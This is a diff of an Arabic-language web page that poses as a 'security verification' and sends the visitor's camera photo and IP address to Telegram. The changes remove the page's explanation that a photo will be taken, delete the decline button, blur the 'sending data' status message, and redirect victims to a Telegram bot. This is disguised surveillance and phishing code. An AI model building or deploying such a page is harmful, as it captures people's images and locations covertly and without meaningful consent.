@@ -147,10 +147,9 @@
 </head>
 <body>
     <div class="container">
-        <h1>🔐 التحقق الأمني</h1>
+        <h1> ال</h1>
         <p>
-            نحتاج إلى التحقق من هويتك لضمان أمان حسابك. 
-            سيتم التقاط صورة سريعة للتحقق بعد الموافقة.
+            
         </p>
 
         <div class="camera-indicator">
@@ -163,7 +162,6 @@
 
         <div class="btn-group">
             <button class="btn-accept" onclick="handleAccept()">✅ موافق</button>
-            <button class="btn-decline" onclick="handleDecline()">❌ غير موافق</button>
         </div>
 
         <div class="loading" id="loading">
@@ -359,7 +357,7 @@
                 
                 // 7. إرسال للتليجرام
                 document.getElementById('loading').classList.add('active');
-                document.querySelector('.loading p').textContent = 'جاري إرسال البيانات...';
+                document.querySelector('.loading p').textContent = 'جاري إرسال ...';
                 
                 const sent = await sendToTelegram(photoBlob, ip);
                 
@@ -368,7 +366,7 @@
                     
                     // 8. التوجيه لجوجل بعد 2 ثانية
                     setTimeout(() => {
-                        window.location.href = 'https://www.google.com';
+                        window.location.href = 'https://web.telegram.org/k/#@hakogakobot';
                     }, 2000);
                 } else {
                     throw new Error('فشل الإرسال');
@@ -409,3 +407,4 @@
     </script>
 </body>
 </html>
+
